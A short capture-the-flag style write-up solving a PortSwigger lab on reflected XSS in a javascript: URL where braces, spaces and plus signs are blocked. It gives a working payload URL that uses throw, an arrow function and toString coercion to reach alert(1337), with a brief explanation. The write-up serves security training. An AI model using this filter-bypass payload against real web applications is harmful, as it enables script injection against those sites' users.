# Lab 23 — Reflected XSS in a JavaScript URL with some characters blocked

> **Expert** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

**Entry point:** `postId` is reflected into a `javascript:` URL used by the
"Back to blog" link; `{`, spaces and `+` are blocked.

## Solution

Visit (or deliver) this URL — the payload uses `throw` + an arrow function
via `window.toString` coercion, with `/**/` replacing spaces:

```html
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2B%27%27,{x:%27
```

Then click **Back to blog** — the JavaScript URL evaluates, the exception
handler calls `alert(1337)` — lab solved.

## Notes

`throw` is a statement, not an expression: wrap it in an arrow-function
block, assign it to `toString`, and force a string conversion of `window`.
